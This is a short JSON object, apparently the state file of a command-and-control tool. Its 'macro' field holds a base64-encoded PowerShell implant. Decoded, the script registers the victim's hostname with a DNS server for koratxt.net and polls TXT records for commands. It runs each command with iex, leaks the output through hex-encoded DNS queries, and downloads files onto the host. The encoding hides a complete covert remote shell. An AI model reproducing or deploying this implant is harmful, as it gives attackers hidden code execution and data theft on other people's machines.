{"id": 1, "currID": "", "clients": {}, "macro": "77u/DQokc2VydmVyID0gJzE5Mi4xNjguMS4xMTMnDQokbmFtZSA9ICdrb3JhdHh0Lm5ldCcNCiRob3N0bmFtZSA9IEdldC1Db250ZW50IGVudjpjb21wdXRlcm5hbWUNCmlmICgkaG9zdG5hbWUuTGVuZ3RoIC1ndCAyMykgew0KICAgICRob3N0bmFtZSA9ICRob3N0bmFtZS5TdWJzdHJpbmcoMCwyMykNCn0NCg0KZnVuY3Rpb24gc2VydmVyR2V0KCRxdWVyeSl7DQogICAgcmV0dXJuIFtTeXN0ZW0uVGV4dC5FbmNvZGluZ106OlVURjguR2V0U3RyaW5nKFtTeXN0ZW0uQ29udmVydF06OkZyb21CYXNlNjRTdHJpbmcoJChSZXNvbHZlLURuc05hbWUgLVNlcnZlciAkc2VydmVyIC1OYW1lICIkcXVlcnkuJG5hbWUiIC1UeXBlIFRYVCkuU3RyaW5ncykpDQp9DQoNCmZ1bmN0aW9uIFN0cmluZ1RvSGV4KCRpKSB7DQogICAgJHIgPSAiIg0KICAgICRpLlRvQ2hhckFycmF5KCkgfCBGb3JFYWNoLU9iamVjdCAtUHJvY2VzcyB7DQogICAgICAgICRyICs9ICd7MDpYMn0nIC1mIFtpbnRdW2NoYXJdJF8NCiAgICB9DQogICAgcmV0dXJuICRyDQp9DQoNCmZ1bmN0aW9uIEhleFRvU3RyaW5nKCRpKSB7DQogICAgJHIgPSAiIg0KICAgIGZvciAoJG4gPSAwOyAkbiAtbHQgJGkubGVuZ3RoOyAkbiArPSAyKSB7DQogICAgICAgICRyICs9IFtjaGFyXVtpbnRdKCIweCIgKyAkaS5TdWJzdHJpbmcoJG4sMikpDQogICAgfQ0KICAgIHJldHVybiAkcg0KfQ0KDQpGdW5jdGlvbiBHZXQtU3RyaW5nSGFzaCANCnsgDQogICAgcGFyYW0NCiAgICAoDQogICAgICAgIFtTdHJpbmddICRTdHJpbmcsDQogICAgICAgICRIYXNoTmFtZSA9ICJNRDUiDQogICAgKQ0KICAgICRieXRlcyA9IFtTeXN0ZW0uVGV4dC5FbmNvZGluZ106OlVURjguR2V0Qnl0ZXMoJFN0cmluZykNCiAgICAkYWxnb3JpdGhtID0gW1N5c3RlbS5TZWN1cml0eS5DcnlwdG9ncmFwaHkuSGFzaEFsZ29yaXRobV06OkNyZWF0ZSgnTUQ1JykNCiAgICAkU3RyaW5nQnVpbGRlciA9IE5ldy1PYmplY3QgU3lzdGVtLlRleHQuU3RyaW5nQnVpbGRlciANCiAgDQogICAgJGFsZ29yaXRobS5Db21wdXRlSGFzaCgkYnl0ZXMpIHwgDQogICAgRm9yRWFjaC1PYmplY3QgeyANCiAgICAgICAgJG51bGwgPSAkU3RyaW5nQnVpbGRlci5BcHBlbmQoJF8uVG9TdHJpbmcoIngyIikpIA0KICAgIH0gDQogIA0KICAgIHJldHVybiAkU3RyaW5nQnVpbGRlci5Ub1N0cmluZygpIA0KfQ0KDQpmdW5jdGlvbiBzcGxpdF90b19jaHVua3MoJGFzdHJpbmcsICRzaXplPTM4KSB7ICAgICAjIGN1cnJlbnRseSwgaWYgdGhlIGNodW5rIGlzIHRoZSBleGFjdCBzaXplIG9mIHRoZSBibG9jaywgYW4gZXh0cmEgZG5zIHJlcXVlc3QgaXMgc2VudC4gbmVlZCB0byB1c2UgYSBkby4uLndoaWxlIGxvb3AgaW5zdGVhZA0KICAgICRuZXdfYXJyID0gQCgpDQogICAgJGNodW5rX2luZGV4PTANCiAgICBmb3IgKCRpPTA7ICRpIC1sdCBbbWF0aF06OmZsb29yKCRhc3RyaW5nLmxlbmd0aCAvICRzaXplKTsgJGkrKykgew0KICAgICAgICAkbmV3X2FyciArPSBAKCRhc3RyaW5nLnN1YnN0cmluZygkY2h1bmtfaW5kZXgsJHNpemUpKQ0KICAgICAgICAkY2h1bmtfaW5kZXggKz0gJHNpemUNCiAgICB9DQogICAgJG5ld19hcnIgKz0gQCgkYXN0cmluZy5zdWJzdHJpbmcoJGNodW5rX2luZGV4LCRhc3RyaW5nLmxlbmd0aCAtICRjaHVua19pbmRleCkpDQogICAgcmV0dXJuICRuZXdfYXJyDQp9DQoNCmZ1bmN0aW9uIHNlbmRfcmVzcG9uc2UoJHJlc3BvbnNlKSB7DQogICAgJGNodW5rcyA9IChzcGxpdF90b19jaHVua3MgKFN0cmluZ1RvSGV4ICgkcmVzcG9uc2UpKSkNCiAgICBmb3JlYWNoICgkaiBpbiAkY2h1bmtzKSB7DQogICAgICAgIHNlcnZlcmdldCgiJGouJGlkLiQoU3RyaW5nVG9IZXgoJ2NuaycpKSIpDQogICAgfQ0KICAgIHNlcnZlcmdldCgiJGlkLiQoU3RyaW5nVG9IZXgoJ2VuZCcpKSIpDQp9DQoNCmZ1bmN0aW9uIGRpc3NvbHZlKCl7DQogICAgc2VydmVyZ2V0KCIkaWQuJChTdHJpbmdUb0hleCgnZGlzJykpIikNCiAgICBFeGl0DQp9DQoNCmZ1bmN0aW9uIGhpYmVybmF0ZSgpew0KICAgICRlbmNDbWQgPSBTdHJpbmdUb0hleCgnaGliJykNCiAgICAkaGliZXJuYXRlTGVuZ3RoID0gW2ludF0kKHNlcnZlcmdldCgiJChTdHJpbmdUb0hleCgndGltZScpKS4kaWQuJGVuY0NtZCIpKQ0KICAgIHNlcnZlcmdldCgiJChTdHJpbmdUb0hleCgnc2V0JykpLiRpZC4kZW5jQ21kIikNCiAgICB0cnl7DQogICAgICAgIHNsZWVwIC1TZWNvbmRzICIkaGliZXJuYXRlTGVuZ3RoIg0KICAgICAgICBzZXJ2ZXJnZXQoIiQoU3RyaW5nVG9IZXgoJ2RvbmUnKSkuJGlkLiRlbmNDbWQiKQ0KICAgIH0gDQogICAgY2F0Y2ggew0KICAgICAgICAkbGFzdGVycm9yID0gJEVycm9yWzBdLkV4Y2VwdGlvbi5NZXNzYWdlDQogICAgICAgIHNlbmRfcmVzcG9uc2UoIiRsYXN0ZXJyb3IiKQ0KICAgIH0NCn0NCg0KZnVuY3Rpb24gc2F2ZWZpbGUoKXsNCiAgICAkZmlsZSA9IEAoKQ0KICAgICRpbmRleCA9IDANCiAgICAkZW5jQ21kID0gU3RyaW5nVG9IZXgoJ2ZpbCcpDQoNCiAgICAkZmlsZW5hbWUgPSBzZXJ2ZXJnZXQoIiQoU3RyaW5nVG9IZXgoJ25hbWUnKSkuJGlkLiRlbmNDbWQiKQ0KICAgICRmaWxlc2l6ZSA9IHNlcnZlcmdldCgiJChTdHJpbmdUb0hleCgnc2l6ZScpKS4kaWQuJGVuY0NtZCIpDQogICAgd2hpbGUgKCRpbmRleCAtbHQgJGZpbGVzaXplKXsNCiAgICAgICAgJGI2NCA9ICQoUmVzb2x2ZS1EbnNOYW1lIC1TZXJ2ZXIgJHNlcnZlciAtTmFtZSAiJChTdHJpbmdUb0hleCgkaW5kZXguVG9TdHJpbmcoKSkpLiRpZC4kZW5jQ21kLiRuYW1lIiAtVHlwZSBUWFQpLlN0cmluZ3NbMF0NCiAgICAgICAgJGluZGV4ICs9ICRiNjQuTGVuZ3RoDQogICAgICAgICRmaWxlICs9IFtDb252ZXJ0XTo6RnJvbUJhc2U2NFN0cmluZygkYjY0KQ0KICAgIH0NCiAgICB0cnl7DQogICAgICAgIFtFbnZpcm9ubWVudF06OkN1cnJlbnREaXJlY3RvcnkgPSAkUFdEDQogICAgICAgIGlleCAnW2lvLmZpbGVdOjpXcml0ZUFsbEJ5dGVzKCRmaWxlbmFtZSwgJGZpbGUpJw0KICAgICAgICBzZXJ2ZXJnZXQoIiQoU3RyaW5nVG9IZXgoJ2RvbmUnKSkuJGlkLiRlbmNDbWQiKQ0KICAgIH0NCiAgICBjYXRjaCB7DQogICAgICAgICRsYXN0ZXJyb3IgPSAkRXJyb3JbMF0uRXhjZXB0aW9uLk1lc3NhZ2UNCiAgICAgICAgc2VuZF9yZXNwb25zZSgiJGxhc3RlcnJvciIpDQogICAgfQ0KICAgIA0KfQ0KDQojaW5pdGlhbGl6ZQ0KJGlkID0gc2VydmVyZ2V0KCIkKFN0cmluZ3RvSGV4KCRob3N0bmFtZSkpLjAuJChTdHJpbmdUb0hleCgnaW50JykpIikNCndoaWxlICghJGlkKXsNCiAgICBzbGVlcCAtU2Vjb25kcyA2MA0KICAgICRpZCA9IHNlcnZlcmdldCgiJChTdHJpbmd0b0hleCgkaG9zdG5hbWUpKS4wLiQoU3RyaW5nVG9IZXgoJ2ludCcpKSIpDQp9DQoNCndoaWxlICgkdHJ1ZSkgew0KICAgICRjbWQgPSBzZXJ2ZXJnZXQoIiRpZC4kKFN0cmluZ1RvSGV4KCdjbWQnKSkiKQ0KDQogICAgaWYgKCRjbWQubGVuZ3RoIC1uZSAwKSB7DQogICAgICAgIGlmICgkY21kIC1lcSAiZGlzc29sdmUiKXsgICAgICAgICAgICAgICAgICAgICAgICMgc2VydmVyIHdhbnRzIHRoZSBjbGllbnQgdG8gZGlzc29sdmUNCiAgICAgICAgICAgIGRpc3NvbHZlDQogICAgICAgIH0NCiAgICAgICAgaWYgKCRjbWQgLWVxICJoaWJlcm5hdGUiKXsgICAgICAgICAgICAgICAgICAgICAgIyBzZXJ2ZXIgd2FudHMgdGhlIGNsaWVudCB0byBzbGVlcA0KICAgICAgICAgICAgaGliZXJuYXRlDQogICAgICAgICAgICBjb250aW51ZQ0KICAgICAgICB9DQogICAgICAgIGlmICgkY21kIC1lcSAiZmlsZSIpeyAgICAgICAgICAgICAgICAgICAgICAgICAgICMgc2VydmVyIHdhbnRzIHRvIHNlbmQgYSBmaWxlDQogICAgICAgICAgICBzYXZlZmlsZQ0KICAgICAgICAgICAgY29udGludWUNCiAgICAgICAgfQ0KICAgICAgICBpZiAoJGNtZCAtbmUgIndhaXQiKXsgICAgICAgICAgICAgICAgICAgICAgICAgICAjIHNlcnZlciBoYXMgYSBjb21tYW5kIHRvIHJ1bg0KICAgICAgICAgICAgdHJ5ew0KICAgICAgICAgICAgICAgICRyZXNwb25zZSA9IChpZXggIiRjbWQiKSB8IE91dC1TdHJpbmcNCiAgICAgICAgICAgICAgICBpZiAoJHJlc3BvbnNlLkxlbmd0aCAtZ3QgMCkgew0KICAgICAgICAgICAgICAgICAgICBzZW5kX3Jlc3BvbnNlICRyZXNwb25zZQ0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgIH0gDQogICAgICAgICAgICBjYXRjaCB7DQogICAgICAgICAgICAgICAgJGxhc3RlcnJvciA9ICRFcnJvclswXS5FeGNlcHRpb24uTWVzc2FnZQ0KICAgICAgICAgICAgICAgIHNlbmRfcmVzcG9uc2UoIiRsYXN0ZXJyb3IiKQ0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQogICAgfQ0KDQogICAgc2xlZXAgLVNlY29uZHMgNQ0KfQ=="}